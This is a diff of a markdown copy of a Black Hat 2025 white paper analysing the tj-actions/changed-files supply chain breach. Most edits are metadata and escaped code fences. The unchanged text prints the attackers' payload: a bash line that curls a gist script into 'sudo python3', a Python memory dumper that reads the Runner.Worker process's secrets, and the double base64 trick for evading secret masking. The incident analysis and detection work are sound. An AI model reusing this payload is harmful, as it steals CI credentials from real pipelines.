@@ -8,19 +8,24 @@ year: 2025
 source_pdf: "BlackHat_USA_2025_Slides/Varun Sharma&Ashish Kurmi_When 'Changed Files' Changed Everything Uncovering and Responding to the tj-actions Supply Chain Breach_WP.pdf"
 pages: 12
 sha256: "b088716fefceb627098b107c73e62acbfe125f8174d72149631acd17403506e0"
-text_chars: 17103
+text_chars: 17142
 ocr_pages: 0
 has_ocr: false
 redacted_secrets: 1
+ocr_confidence: null
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2"
-converted_at: "2026-08-11T23:02:39Z"
+converted_at: "2026-08-12T05:24:24Z"
 ---
 # When 'Changed Files' Changed Everything Uncovering and Responding to the tj-actions Supply Chain Breach
 
 **Speakers:** Varun Sharma, Ashish Kurmi  
 **Conference:** Black Hat USA 2025  
 **Source:** `BlackHat_USA_2025_Slides/Varun Sharma&Ashish Kurmi_When 'Changed Files' Changed Everything Uncovering and Responding to the tj-actions Supply Chain Breach_WP.pdf` (12 pages)
+
 
 ## Slide 1
 
@@ -72,43 +77,43 @@ Attackers leveraged a compromised Personal Access Token (PAT) from the `@tjactio
 
 Attackers created the malicious commit: `0e58ed8671d6b60d0890c21b07f8835ace038e67` .
 
-```
+\```
 $ git tag -l |
-```
+\```
 
 - `while read -r tag ; do git show --format="$tag: %H" --no-patch $tag ; done sort -k2`
 
-```
+\```
 v1.0.0: 0e58ed8671d6b60d0890c21b07f8835ace038e67
-```
+\```
 
-```
+\```
 ...
-```
+\```
 
-```
+\```
 v35.7.7-sec: 0e58ed8671d6b60d0890c21b07f8835ace038e67
-```
+\```
 
-```
+\```
 ...
-```
+\```
 
-```
+\```
 v44.5.1: 0e58ed8671d6b60d0890c21b07f8835ace038e67
-```
+\```
 
-```
+\```
 ...
-```
+\```
 
-```
+\```
 v5: 0e58ed8671d6b60d0890c21b07f8835ace038e67
-```
+\```
 
-```
+\```
 ...
-```
+\```
 
 #### Malicious Payload Details
 
@@ -126,7 +131,7 @@ The commit was accessible at https://github.com/tj-actions/changedfiles/commit/0
 
 The malicious commit included a base64 encoded bash script. The base64 decoded version of the script is given below
 
-```
+\```
 if [[ "$OSTYPE" == "linux-gnu" ]]; then
   B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b
     sudo python3 |
@@ -139,19 +144,19 @@ if [[ "$OSTYPE" == "linux-gnu" ]]; then
 else
   exit 0
 fi
-```
+\```
 
 Double base64 encoding was intentionally used by attackers to bypass GitHub's built-in secret masking feature. For example, the secret:
 
-```
+\```
 "system.github.token":{"value":"ghs_[REDACTED:github-token]","is
-```
+\```
 
 appeared double base64 encoded in logs as:
 
-```
+\```
 SW5ONWMzUmxiUzVuYVhSb2RXSXVkRzlyWlc0aU9uc2lkbUZzZFdVaU9pSm5hSE5mUVV0dGQxZGxae
-```
+\```
 
 localhost:6419
 
@@ -171,44 +176,44 @@ The GitHub Actions worker process named Runner.Worker stores all the secrets req
 
 The githubusercontent.com file has been deleted. However, we saved a copy of the script before it was deleted.
 
-```
+\```
 #!/usr/bin/env python3
 ...
-```
+\```
 
-```
+\```
 def get_pid():
-```
+\```
 
-```
+\```
     # https://stackoverflow.com/questions/2703640/process-list-on-linux-via-p
     pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
-```
+\```
 
-```
+\```
     for pid in pids:
-```
+\```
 
-```
+\```
         with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as cmdline_f:
             if b'Runner.Worker' in cmdline_f.read():
                 return pid
-```
+\```
 
-```
+\```
     raise Exception('Can not get pid of Runner.Worker')
-```
+\```
 
-```
+\```
 if __name__ == "__main__":
     pid = get_pid()
     print(pid)
-```
+\```
 
-```
+\```
     map_path = f"/proc/{pid}/maps"
     mem_path = f"/proc/{pid}/mem"
-```
+\```
 
 localhost:6419
 
@@ -220,7 +225,7 @@ localhost:6419
 
 White Paper.md - Grip
 
-```
+\```
     with open(map_path, 'r') as map_f, open(mem_path, 'rb', 0) as mem_f:
         for line in map_f.readlines():  # for each mapped region
             m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
@@ -232,18 +237,18 @@ White Paper.md - Grip
                 if start > sys.maxsize:
                     continue
                 mem_f.seek(start)  # seek to region start
-```
+\```
 
-```
+\```
                 try:
-```
+\```
 
-```
+\```
                     chunk = mem_f.read(end - start)  # read region contents
                     sys.stdout.buffer.write(chunk)
                 except OSError:
                     continue
-```
+\```
 
 ### Detection Methodology
 
@@ -259,9 +264,9 @@ Detection was facilitated by baseline-driven behavioral monitoring. To provide a
 
 - `pypi.org:443`
 
-```
+\```
 www.githubstatus.com:443
-```
+\```
 
 As the malicious code was executed in the 408th run and the GitHub endpoint that was used for downloading the malicious python code ( `gist.githubusercontent.com` ) was not in the baseline, this network destination was flagged as anomalous. Based on the runtime monitoring for this workflow run, the following process made the anomalous call:
 
@@ -269,10 +274,10 @@ As the malicious code was executed in the 408th run and the GitHub endpoint that
 
 - Process Arguments: `curl -sSf`
 
-```
+\```
 https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f
 254965/raw/memdump.py
-```
+\```
 
 5/12
 
@@ -348,9 +353,9 @@ The execution chain resembled:
 
 - `name: Setup reviewdog`
 
-```
+\```
   uses: reviewdog/action-setup@v1
-```
+\```
 
 localhost:6419
 
